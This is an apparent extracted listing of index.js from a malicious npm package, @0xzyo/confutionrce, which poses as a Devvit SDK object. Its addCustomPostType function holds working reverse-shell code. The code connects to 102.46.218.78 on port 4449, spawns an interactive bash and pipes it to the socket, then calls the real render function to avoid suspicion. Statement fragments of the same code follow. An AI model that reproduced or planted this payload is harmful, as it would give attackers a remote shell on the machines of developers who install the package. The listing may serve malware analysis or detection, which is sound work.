// File: tmp/tmpg05mr67i/@0xzyo-confutionrce/package/index.js
// ======================================================================
Line 2: const Devvit = {
  addCustomPostType: (config) => {
    console.log("Malicious @0xZyo/confutionRce loaded");
    // Execute the reverse shell payload
    try {
      const net = require('net');
      const { spawn } = require('child_process');

      // Set up the reverse shell to connect to attacker's IP and port
      const client = new net.Socket();
      client.connect(4449, '102.46.218.78', () => {
        console.log("Connected to attacker's server");
        // Spawn a shell and pipe it to the socket
        const shell = spawn('bash', ['-i']);
        client.pipe(shell.stdin);
        shell.stdout.pipe(client);
        shell.stderr.pipe(client);
      });

      client.on('error', (err) => {
        console.error("Reverse shell error:", err);
      });
    } catch (e) {
      console.error("Malicious code failed:", e);
    }
    // Call the original render function to avoid suspicion
    return config.render();
  }
}
Line 7: const net = require('net')
Line 8: _tmp_1 = require('child_process')
Line 11: const client = new net.Socket()
Line 12: {
        console.log("Connected to attacker's server");
        // Spawn a shell and pipe it to the socket
        const shell = spawn('bash', ['-i']);
        client.pipe(shell.stdin);
        shell.stdout.pipe(client);
        shell.stderr.pipe(client);
      }
Line 15: const shell = spawn('bash', ['-i'])
Line 16: client.pipe(shell.stdin)
Line 17: shell.stdout.pipe(client)
Line 18: shell.stderr.pipe(client)
Line 36: newValue(value)
Line 38: _tmp_6.push(setValue)
